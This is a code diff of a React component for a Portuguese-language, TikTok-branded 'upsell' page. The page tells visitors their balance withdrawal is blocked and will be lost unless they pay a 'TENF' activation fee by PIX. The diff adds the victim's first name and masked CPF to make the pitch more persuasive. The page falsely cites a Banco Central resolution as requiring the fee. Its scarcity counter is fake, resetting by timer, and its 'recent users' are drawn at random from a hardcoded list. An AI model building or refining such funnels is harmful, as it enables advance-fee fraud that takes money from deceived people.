@@ -12,6 +12,9 @@ const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadN
   const [recentUser, setRecentUser] = useState("");
   const recentNames = ["Maria S.", "João P.", "Ana L.", "Carlos R.", "Fernanda M.", "Ricardo T.", "Patrícia G.", "Lucas H.", "Camila D.", "Bruno F."];
 
+  const firstName = leadName ? leadName.split(" ")[0] : "";
+  const maskCpf = (cpf: string) => cpf.length >= 11 ? `${cpf.slice(0, 3)}.***.***.${cpf.slice(-2)}` : cpf;
+
   useEffect(() => { const interval = setInterval(() => setActivationsLeft(prev => (prev <= 2 ? 7 : prev - 1)), 25000); return () => clearInterval(interval); }, []);
   useEffect(() => { const pick = () => setRecentUser(recentNames[Math.floor(Math.random() * recentNames.length)]); pick(); const interval = setInterval(pick, 12000); return () => clearInterval(interval); }, []);
 
@@ -20,14 +23,24 @@ const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadN
       <div className="bg-gray-50 pt-3 pb-4 px-4 border-b border-gray-200">
         <div className="max-w-md mx-auto flex flex-col items-center">
           <img src={tiktokLogo} alt="TikTok" className="h-7 object-contain mb-2" />
-          <p className="text-gray-400 text-[10px] mb-0.5">Saldo disponível</p>
-          <p className="text-gray-900 text-[28px] font-extrabold leading-none">{balance}</p>
+          {firstName ? (
+            <>
+              <p className="text-gray-500 text-[11px] mb-0.5">Saldo reservado para <strong className="text-gray-800">{firstName}</strong></p>
+              <p className="text-gray-900 text-[28px] font-extrabold leading-none">{balance}</p>
+              {leadCpf && <p className="text-gray-400 text-[10px] mt-0.5">CPF: {maskCpf(leadCpf)}</p>}
+            </>
+          ) : (
+            <>
+              <p className="text-gray-400 text-[10px] mb-0.5">Saldo disponível</p>
+              <p className="text-gray-900 text-[28px] font-extrabold leading-none">{balance}</p>
+            </>
+          )}
         </div>
       </div>
       <main className="px-4 py-3 space-y-3 max-w-md mx-auto pb-6">
         <div className="bg-red-50 border border-red-200 rounded-xl p-3">
           <div className="flex items-center gap-2 mb-1.5"><AlertTriangle className="w-4 h-4 text-[#FE2C55]" /><span className="text-[#FE2C55] text-xs font-bold uppercase tracking-wide">⛔ Saque Bloqueado — Ação Imediata</span></div>
-          <p className="text-gray-600 text-xs leading-relaxed">Seu saque de <strong className="text-gray-900">{balance}</strong> será <strong className="text-red-600">CANCELADO PERMANENTEMENTE</strong> em 24h se o TENF não for ativado. A Resolução nº 4.893 do Banco Central <strong className="text-gray-900">obriga a validação fiscal</strong> para liberar qualquer transferência acima de R$ 1.500. <strong className="text-red-600">Sem o TENF, você perde o saldo inteiro.</strong></p>
+          <p className="text-gray-600 text-xs leading-relaxed">{firstName ? <><strong className="text-gray-900">{firstName}</strong>, seu</> : "Seu"} saque de <strong className="text-gray-900">{balance}</strong> será <strong className="text-red-600">CANCELADO PERMANENTEMENTE</strong> em 24h se o TENF não for ativado. A Resolução nº 4.893 do Banco Central <strong className="text-gray-900">obriga a validação fiscal</strong> para liberar qualquer transferência acima de R$ 1.500. <strong className="text-red-600">Sem o TENF, você perde o saldo inteiro.</strong></p>
         </div>
         {leadCpf && (<div className="bg-gray-50 rounded-lg p-2.5 flex items-center gap-2.5 border border-gray-200"><span className="text-sm">🪪</span><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[10px]">CPF: {leadCpf}</p></div><span className="text-emerald-600 text-[10px] font-bold">Verificado ✓</span></div>)}
         <div className="bg-red-50/50 rounded-xl p-3 border border-red-200 space-y-2">
@@ -42,7 +55,7 @@ const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadN
           <div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-xs">Taxa única de ativação</span><span className="bg-emerald-100 text-emerald-700 text-[10px] font-bold px-2 py-0.5 rounded-full">{discountLabel}</span></div>
           <div className="flex items-baseline gap-2 mb-1"><span className="text-gray-300 text-sm line-through">{anchorPrice}</span><span className="text-gray-900 text-3xl font-extrabold">{price}</span></div>
           <p className="text-emerald-600 text-[11px] font-medium mb-1">✅ Reembolso automático em 2 min se o saque não cair</p>
-          <p className="text-red-500 text-[10px] font-semibold mb-4">❌ Sem ativação = perda total do saldo de {balance}</p>
+          <p className="text-red-500 text-[10px] font-semibold mb-4">❌ {firstName ? `${firstName}, sem` : "Sem"} ativação = perda total do saldo de {balance}</p>
           <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-emerald-500 text-white font-bold text-base hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/30" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>
             {isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>LIBERAR MEU SAQUE AGORA<ChevronRight className="w-4 h-4" /></>)}
           </button>
@@ -65,7 +78,7 @@ const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadN
           </div>
         </div>
         <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-emerald-500 text-white font-bold text-[15px] hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/30" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>
-          {isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>ATIVAR TENF E RECEBER {balance}<ChevronRight className="w-4 h-4" /></>)}
+          {isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>{firstName ? `${firstName.toUpperCase()}, ATIVAR TENF E RECEBER` : "ATIVAR TENF E RECEBER"} {balance}<ChevronRight className="w-4 h-4" /></>)}
         </button>
         <p className="text-gray-300 text-[9px] text-center pb-2">Taxa regulamentada pelo Banco Central do Brasil • Resolução nº 4.893</p>
       </main>
